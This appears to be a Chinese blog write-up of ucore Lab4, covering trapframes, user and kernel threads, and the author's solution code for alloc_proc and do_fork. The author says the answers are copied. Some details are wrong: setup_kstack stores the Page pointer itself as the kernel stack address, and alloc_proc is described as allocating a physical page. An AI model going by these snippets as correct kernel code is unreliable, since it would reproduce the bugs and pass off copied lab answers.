<h2 id="中断帧"><a href="#中断帧" class="headerlink" title="中断帧"></a>中断帧</h2><p>中断发生时：内核将进程的所有寄存器的值放到了进程的 trapframe 结构中</p>
<p>trapframe 保存的都是一些系统关键的寄存器，这里我们只需要特别关注4个寄存器（涉及到程序执行的控制流问题）：</p>
<ul>
<li>EFLAGS：状态寄存器（本实验暂时用不到）</li>
<li>EIP：Instruction Pointer，当前执行的汇编指令的地址</li>
<li>ESP：当前的栈顶</li>
<li>EBP：当前的栈底，当前过程的帧在栈中的开始地址(高地址) </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pushregs</span> <span class="title">tf_regs</span>;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> tf_gs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding0;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_fs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding1;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_es;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding2;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ds;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding3;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_trapno;</span><br><span class="line">    <span class="comment">/* below here defined by x86 hardware */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> tf_err;</span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_eip;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_cs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding4;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_eflags;</span><br><span class="line">    <span class="comment">/* below here only when crossing rings, such as from user to kernel */</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_esp;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ss;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding5;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
<h2 id="用户线程与内核线程"><a href="#用户线程与内核线程" class="headerlink" title="用户线程与内核线程"></a>用户线程与内核线程</h2><p>线程有三种实现方式</p>
<ul>
<li>用户线程：在用户空间实现（POSIX Pthread）<ul>
<li>用户线程的定义：<ul>
<li>用户线程是由一组用户级的线程库函数来完成线程的管理，包括线程的创建、终止、同步和调度等</li>
</ul>
</li>
<li>用户线程的特征：<ul>
<li>不依赖于操作系统内核，在用户空间实现线程机制<ul>
<li>可用于不支持线程的多进程操作系统</li>
<li>线程控制模块（TCB）由线程库函数内部维护</li>
</ul>
</li>
<li>同一个进程内的用户线程切换速度块，无需用户态/核心态切换</li>
<li>允许每个进程拥有自己的线程调度算法</li>
</ul>
</li>
<li>用户进程的缺点：<ul>
<li>线程发起系统调用而阻塞时，整个进程都会进入等待状态</li>
<li>不支持基于线程的处理机抢占</li>
<li>只能按进程分配CPU时间</li>
</ul>
</li>
</ul>
</li>
<li>内核线程：在内核中实现（Windows，Linux）<ul>
<li>内核线程的定义：<ul>
<li>内核线程是由内核通过系统调用实现的线程机制，由内核完成线程的创建、终止和管理</li>
</ul>
</li>
<li>内核线程的特征：<ul>
<li>由内核自己维护PCB和TCB</li>
<li>线程执行系统调用而被阻塞不影响其他线程</li>
<li>线程的创建、终止和切换消耗相对较大</li>
<li>以线程为单位进行CPU时间分配，其中多线程进程可以获得更多的CPU时间</li>
</ul>
</li>
</ul>
</li>
<li>轻权进程：轻权进程是操作系统内核支持的用户线程<ul>
<li>轻权进程的特点：<ul>
<li>用户线程可以自定义调度算法，但存在部分缺点</li>
<li>而内核线程不存在用户线程的各种缺点</li>
<li>所以轻权进程是用户线程与内核线程的结合产物</li>
</ul>
</li>
<li>轻权进程的模型图：</li>
</ul>
</li>
</ul>
<img src="/2022/04/19/Ucore-Lab4/1650201455136-1651324459313.png" class width="1650201455136"> 
<h2 id="练习0-把-lab3-的内容复制粘贴到-lab4"><a href="#练习0-把-lab3-的内容复制粘贴到-lab4" class="headerlink" title="练习0-把 lab3 的内容复制粘贴到 lab4"></a>练习0-把 lab3 的内容复制粘贴到 lab4</h2><h2 id="练习1-分配并初始化一个进程控制块"><a href="#练习1-分配并初始化一个进程控制块" class="headerlink" title="练习1-分配并初始化一个进程控制块"></a>练习1-分配并初始化一个进程控制块</h2><p>alloc_proc 函数负责分配并返回一个新的 struct proc_struct 结构，用于存储新建立的内核线程的管理信息，ucore 需要对这个结构进行最基本的初始化，你需要完成这个初始化过程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *</span></span><br><span class="line"><span class="function"><span class="title">alloc_proc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> =</span> kmalloc(<span class="keyword">sizeof</span>(struct proc_struct));</span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">//LAB4:EXERCISE1 YOUR CODE</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * below fields in proc_struct need to be initialized</span></span><br><span class="line"><span class="comment">     *       enum proc_state state;	       // Process state</span></span><br><span class="line"><span class="comment">     *       int pid;                      // Process ID</span></span><br><span class="line"><span class="comment">     *       int runs;                     // the running times of Proces</span></span><br><span class="line"><span class="comment">     *       uintptr_t kstack;             // Process kernel stack</span></span><br><span class="line"><span class="comment">     *       volatile bool need_resched;   // bool value: need to be rescheduled to release CPU?</span></span><br><span class="line"><span class="comment">     *       struct proc_struct *parent;   // the parent process</span></span><br><span class="line"><span class="comment">     *       struct mm_struct *mm;         // Process&#x27;s memory management field</span></span><br><span class="line"><span class="comment">     *       struct context context;       // Switch here to run process</span></span><br><span class="line"><span class="comment">     *       struct trapframe *tf;         // Trap frame for current interrupt</span></span><br><span class="line"><span class="comment">     *       uintptr_t cr3;                // CR3 register: the base addr of Page Directroy Table(PDT)</span></span><br><span class="line"><span class="comment">     *       uint32_t flags;               // Process flag</span></span><br><span class="line"><span class="comment">     *       char name[PROC_NAME_LEN + 1]; // Process name</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的关键就是初始化一个 proc_struct 结构体：</p>
<ul>
<li>首先需要知道 proc_struct 结构体的内容</li>
<li>然后需要明白它的各个条目该初始化为什么</li>
</ul>
<p>下面是实现的过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *</span></span><br><span class="line"><span class="function"><span class="title">alloc_proc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> =</span> kmalloc(<span class="keyword">sizeof</span>(struct proc_struct));</span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        proc-&gt;state = PROC_UNINIT;			<span class="comment">// 进程所处状态-未初始化的</span></span><br><span class="line">        proc-&gt;pid = <span class="number">-1</span>;					   <span class="comment">// 进程的PID为&quot;-1&quot;</span></span><br><span class="line">        proc-&gt;runs = <span class="number">0</span>;					   <span class="comment">// 进程的运行时间为0</span></span><br><span class="line">        proc-&gt;kstack = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">0</span>;			    <span class="comment">// 该进程不需要被CPU调度</span></span><br><span class="line">        proc-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;(proc-&gt;context), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct context));</span><br><span class="line">        proc-&gt;tf = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;cr3 = boot_cr3;			    <span class="comment">// 页目录为内核页目录表的基址</span></span><br><span class="line">        proc-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(proc-&gt;name, <span class="number">0</span>, PROC_NAME_LEN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实，具体的操作流程需要看后续的代码是怎么安排的，我为了省事就直接抄答案了</p>
<ul>
<li><code>context</code>是进程的上下文：用于进程的上下文切换</li>
<li><code>*tf</code> 是中断帧指针：总是指向内核栈的某个位置 <ul>
<li>当进程从用户空间跳到内核空间时，中断帧记录了进程在被中断前的状态</li>
<li>当内核需要跳回用户空间时，需要调整中断帧以恢复让进程继续执行的各寄存器值</li>
<li><code>trapframe</code> 包含了 <code>context</code> 的信息</li>
</ul>
</li>
</ul>
<h2 id="练习2-为新创建的内核线程分配资源"><a href="#练习2-为新创建的内核线程分配资源" class="headerlink" title="练习2-为新创建的内核线程分配资源"></a>练习2-为新创建的内核线程分配资源</h2><p><code>do_fork</code> 的作用是，创建当前内核线程的一个副本，它们的执行上下文、代码、数据都一样，但是存储位置不同，在这个过程中，需要给新内核线程分配资源，并且复制原进程的状态</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_fork</span><span class="params">(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="comment">/* &lt;-------- start --------&gt; */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;-------- end --------&gt; */</span> </span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求：</p>
<ul>
<li>调用 alloc_proc 来分配一个 proc_struct</li>
<li>调用 setup_kstack 为子进程分配内核堆栈</li>
<li>根据 clone_flag 调用 copy_mm 或 share mm</li>
<li>调用 copy_thread 在 proc_struct 中设置中断帧指针和上下文</li>
<li>将 proc_struct 插入 hash_list和proc_list</li>
<li>调用 wakeup_proc 使新的子进程可以运行</li>
<li>使用子进程的 pid 设置 ret vaule</li>
</ul>
<p>我们可用的函数：</p>
<ul>
<li>alloc_proc：分配一张物理页</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *</span></span><br><span class="line"><span class="function"><span class="title">alloc_proc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> =</span> kmalloc(<span class="keyword">sizeof</span>(struct proc_struct));</span><br><span class="line">    <span class="comment">/* kmalloc:分配连续的物理地址,用于小内存分配 */</span></span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123; <span class="comment">/* 初始化各个参数(和“练习1”的代码一样) */</span></span><br><span class="line">        proc-&gt;state = PROC_UNINIT; </span><br><span class="line">        proc-&gt;pid = <span class="number">-1</span>;</span><br><span class="line">        proc-&gt;runs = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;kstack = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;(proc-&gt;context), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct context));</span><br><span class="line">        proc-&gt;tf = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;cr3 = boot_cr3;</span><br><span class="line">        proc-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(proc-&gt;name, <span class="number">0</span>, PROC_NAME_LEN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>setup_kstack：将大小为 KSTACKPAGE 的页面作为进程内核堆栈</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KSTACKPAGE          2                           </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">setup_kstack</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> alloc_pages(KSTACKPAGE); <span class="comment">/* 分配两张物理页 */</span></span><br><span class="line">    <span class="keyword">if</span> (page != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        proc-&gt;kstack = (<span class="keyword">uintptr_t</span>)(page); <span class="comment">/* proc_struct-&gt;kstack:内核栈 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>copy_mm：把所有的虚拟页数据复制到新的进程（本实验中没有任何作用）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">copy_mm</span><span class="params">(<span class="keyword">uint32_t</span> clone_flags, struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    assert(current-&gt;mm == <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* do nothing in this project */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>copy_thread：在进程的内核堆栈顶部设置 trapframe，并设置进程的内核入口点和堆栈</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">copy_thread</span><span class="params">(struct proc_struct *proc, <span class="keyword">uintptr_t</span> esp, struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - <span class="number">1</span>;</span><br><span class="line">    *(proc-&gt;tf) = *tf;</span><br><span class="line">    proc-&gt;tf-&gt;tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line">    proc-&gt;tf-&gt;tf_esp = esp;</span><br><span class="line">    proc-&gt;tf-&gt;tf_eflags |= FL_IF;</span><br><span class="line"></span><br><span class="line">    proc-&gt;context.eip = (<span class="keyword">uintptr_t</span>)forkret;</span><br><span class="line">    proc-&gt;context.esp = (<span class="keyword">uintptr_t</span>)(proc-&gt;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>hash_proc：将 proc 添加到进程哈希链表中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HASH_SHIFT          10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pid_hashfn(x)       (hash32(x, HASH_SHIFT))</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">list_entry_t</span> hash_list[HASH_LIST_SIZE]; <span class="comment">/* 进程哈希链表的入口地址 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">hash_proc</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    list_add(hash_list + pid_hashfn(proc-&gt;pid), &amp;(proc-&gt;hash_link));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>get_pid：为进程分配唯一的PID</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PROCESS                 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PID                     (MAX_PROCESS * 2)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">get_pid</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static_assert</span>(MAX_PID &gt; MAX_PROCESS);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *<span class="built_in">list</span> = &amp;proc_list, *le; <span class="comment">/* 设置*prev和*next */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> next_safe = MAX_PID, last_pid = MAX_PID;</span><br><span class="line">    <span class="keyword">if</span> (++ last_pid &gt;= MAX_PID) &#123; </span><br><span class="line">        last_pid = <span class="number">1</span>; <span class="comment">/* 讲真没有看懂这里有啥意义 */</span></span><br><span class="line">        <span class="keyword">goto</span> inside;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (last_pid &gt;= next_safe) &#123;</span><br><span class="line">    inside:</span><br><span class="line">        next_safe = MAX_PID;</span><br><span class="line">    repeat:</span><br><span class="line">        le = <span class="built_in">list</span>; <span class="comment">/* 初始le为哈希进程链表入口 */</span></span><br><span class="line">        <span class="keyword">while</span> ((le = list_next(le)) != <span class="built_in">list</span>) &#123; <span class="comment">/* 遍历哈希进程链表 */</span></span><br><span class="line">            proc = le2proc(le, list_link); <span class="comment">/* 根据链表信息获取进程地址 */</span></span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;pid == last_pid) &#123;</span><br><span class="line">                <span class="keyword">if</span> (++ last_pid &gt;= next_safe) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (last_pid &gt;= MAX_PID) &#123;</span><br><span class="line">                        last_pid = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    next_safe = MAX_PID;</span><br><span class="line">                    <span class="keyword">goto</span> repeat;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (proc-&gt;pid &gt; last_pid &amp;&amp; next_safe &gt; proc-&gt;pid) &#123;</span><br><span class="line">                next_safe = proc-&gt;pid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> last_pid; <span class="comment">/* 返回一个不重复的pid */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wakeup_proc：设置 proc-&gt;state = PROC_RUNNABLE（程序可运行）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">wakeup_proc</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    assert(proc-&gt;state != PROC_ZOMBIE &amp;&amp; proc-&gt;state != PROC_RUNNABLE);</span><br><span class="line">    proc-&gt;state = PROC_RUNNABLE; <span class="comment">/* 程序可运行 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> E_NO_FREE_PROC      5   <span class="comment">// 尝试创建一个新的process beyond</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KSTACKPAGE          2     </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_fork</span><span class="params">(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;-------- start --------&gt; */</span></span><br><span class="line">    <span class="keyword">if</span> ((proc = alloc_proc()) == <span class="literal">NULL</span>) &#123; <span class="comment">/* 分配一个物理页,作为proc_struct */</span></span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    proc-&gt;parent = current; <span class="comment">/* 设置父进程为当前进程 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>) &#123; <span class="comment">/* 分配内核栈 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>) &#123; <span class="comment">/* 将所有虚拟页数据复制过去 */</span></span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    &#125;</span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf); <span class="comment">/* 复制线程的状态,包括寄存器上下文等等 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag); <span class="comment">/* 阻塞中断 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        proc-&gt;pid = get_pid(); <span class="comment">/* 为进程分配唯一的PID */</span></span><br><span class="line">        hash_proc(proc); <span class="comment">/* 将proc添加到进程哈希链表中 */</span></span><br><span class="line">        list_add(&amp;proc_list, &amp;(proc-&gt;list_link)); <span class="comment">/* 将proc添加到进程链表中 */</span></span><br><span class="line">        nr_process ++; <span class="comment">/* 将全局线程的数目加1 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag); <span class="comment">/* 解除中断的阻塞 */</span></span><br><span class="line">    wakeup_proc(proc); <span class="comment">/* 设置新的子进程可执行 */</span></span><br><span class="line">    ret = proc-&gt;pid; <span class="comment">/* 设置返回值为pid */</span></span><br><span class="line">    <span class="comment">/* &lt;-------- end --------&gt; */</span> </span><br><span class="line">    </span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
